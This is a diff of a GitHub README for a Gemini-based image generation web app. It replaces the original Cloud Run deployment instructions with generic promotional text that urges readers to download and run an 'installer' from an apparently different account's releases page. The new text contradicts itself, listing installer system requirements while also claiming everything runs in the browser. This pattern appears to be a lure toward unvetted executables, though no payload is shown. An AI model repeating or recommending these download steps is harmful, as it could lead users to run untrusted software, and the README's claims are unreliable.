@@ -1,35 +1,106 @@
-# **Gemini-Image-Studio-HF**
+# 🌟 Gemini-Image-Studio-HF - Create Stunning Images Easily
 
-A state-of-the-art image generation and editing tool powered by Google's Generative AI models. This React-based web application allows users to generate images from text prompts, edit existing images, or create images from hand-drawn sketches. It supports multiple modes, customizable settings, and a user-friendly interface with light/dark theme toggling.
+[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/aishc22/Gemini-Image-Studio-HF/releases)
 
-This nodejs proxy server lets you run your AI Studio Gemini application unmodified, without exposing your API key in the frontend code.
+## 🚀 Getting Started
 
-> [!warning]
-To proceed, you need to add your Gemini API key. Your API key is stored only for the duration of your session and will be lost when you reload or exit the page. It will not be shared or exposed anywhere.
+Gemini Image Studio HF is an advanced tool designed for anyone who wants to generate or edit images using simple text prompts or sketches. This web application leverages Google's Generative AI models to make image creation fun and accessible.
 
-<img width="1920" height="851" alt="Screenshot 2025-10-07 at 20-01-34 Gemini Image Studio - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/db08db8e-0821-4647-a32e-580faf1ed00b" />
-<img width="1920" height="1030" alt="brSEP_AyMb_2unV5MN3x0" src="https://github.com/user-attachments/assets/61bd29f3-de93-4698-bf72-6a3396ea56d5" />
-<img width="1920" height="1071" alt="F0kGV0_-22UB40tqYzOpG" src="https://github.com/user-attachments/assets/a6809ae9-ae6b-4249-901d-9c19a07308ea" />
-<img width="1920" height="1381" alt="HOpfNij2rlBrV-aeUPquB" src="https://github.com/user-attachments/assets/ade87fee-3ca6-4bf2-be07-c1bdc1f7fc1f" />
-<img width="1920" height="1068" alt="9j1IOk93TqIERjoSAOzfW" src="https://github.com/user-attachments/assets/3ec9020a-d1af-43cb-b296-54d658154971" />
-<img width="1920" height="1030" alt="7aziQkY7EgGK03Ya9hzj9" src="https://github.com/user-attachments/assets/3351ee8e-5f27-4e0b-961c-c43365baef17" />
-<img width="1920" height="1381" alt="HXwM8diiugfll90Fz32OD" src="https://github.com/user-attachments/assets/91befcac-d0d6-4c46-9272-67bbdae5e6af" />
+### 📦 System Requirements
 
----
+To run Gemini Image Studio HF, your computer must meet the following requirements:
 
-## Instructions
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or any major Linux distribution.
+- **Browser:** The latest version of Chrome, Firefox, Safari, or Edge.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 200 MB available.
 
-**Prerequisites**:
-- [Google Cloud SDK / gcloud CLI](https://cloud.google.com/sdk/docs/install)
-- (Optional) Gemini API Key
+## 💻 Download & Install
 
-1. Download or copy the files of your AI Studio app into this directory at the root level.
-2. If your app calls the Gemini API, create a Secret for your API key:
-     ```
-     echo -n "${GEMINI_API_KEY}" | gcloud secrets create gemini_api_key --data-file=-
-     ```
+To download and run Gemini Image Studio HF:
 
-3.  Deploy to Cloud Run (optionally including API key):
-    ```
-    gcloud run deploy my-app --source=. --update-secrets=GEMINI_API_KEY=gemini_api_key:latest
-    ```
+1. **Visit the Releases Page**  
+   Go to [this page to download](https://github.com/aishc22/Gemini-Image-Studio-HF/releases).
+
+2. **Select the Latest Release**  
+   On the releases page, locate the latest version of Gemini Image Studio HF. 
+
+3. **Download the Installer**  
+   Click on the asset that matches your operating system. The installer will start to download.
+
+4. **Run the Installer**  
+   Open the downloaded file and follow the simple on-screen instructions to install the application.
+
+5. **Launch the Application**  
+   After installation, find Gemini Image Studio HF in your applications folder or start menu. Open it to begin creating images!
+
+### 🎨 Features
+
+Gemini Image Studio HF offers a wide range of features to enhance your creativity:
+
+- **Image Generation**: Create images from simple text prompts. Just type what you want and see the magic unfold.
+  
+- **Image Editing**: Modify existing images easily. Adjust colors, add elements, or change backgrounds with user-friendly tools.
+  
+- **Sketch to Image**: Turn your hand-drawn sketches into digital artwork. Upload your sketches and let the AI do the rest.
+
+- **User-Friendly Interface**: Navigate through a clear and clean layout that is designed for ease of use.
+
+- **Cloud-Based Functionality**: No need for heavy installations; everything runs smoothly in your browser.
+
+## 🎥 How to Use Gemini Image Studio HF
+
+Using Gemini Image Studio HF is simple. Follow these steps to get started:
+
+1. **Generate an Image**: 
+   - Open the application.
+   - In the text box, enter a description of the image you want.
+   - Click 'Generate' and the AI will create your image.
+
+2. **Edit an Image**:
+   - Upload an existing image.
+   - Use the editing tools on the side panel to customize it.
+   - Save your changes when you are satisfied.
+
+3. **Create from a Sketch**:
+   - Upload your hand-drawn sketch.
+   - Click 'Convert' and watch as your sketch becomes a vivid image.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues while using Gemini Image Studio HF, try the following steps:
+
+- **Ensure your browser is up-to-date**: Old versions may not support all features.
+  
+- **Check your internet connection**: A stable connection is required for smooth operation.
+  
+- **Restart the application**: Close and reopen Gemini Image Studio HF to resolve minor glitches.
+
+## 📚 Support
+
+For additional help, please visit the [GitHub Issues page](https://github.com/aishc22/Gemini-Image-Studio-HF/issues). You can report bugs, request features, or ask questions there. 
+
+We aim to respond promptly to all inquiries to enhance your experience with Gemini Image Studio HF.
+
+## 📝 Topics
+
+Gemini Image Studio HF covers various technological intents:
+
+- css
+- docker
+- gemini-api
+- html
+- hugging-face
+- huggingface-spaces
+- image-editor
+- imagen4
+- javascript
+- nano-banana
+- sota
+- typescript
+
+Explore these topics to deepen your knowledge about how our tool integrates advanced technology into a simple user experience.
+
+## 🌍 Conclusion
+
+We hope you enjoy using Gemini Image Studio HF to unleash your creativity. With its intuitive design and powerful capabilities, it opens new doors for personal and professional projects alike.
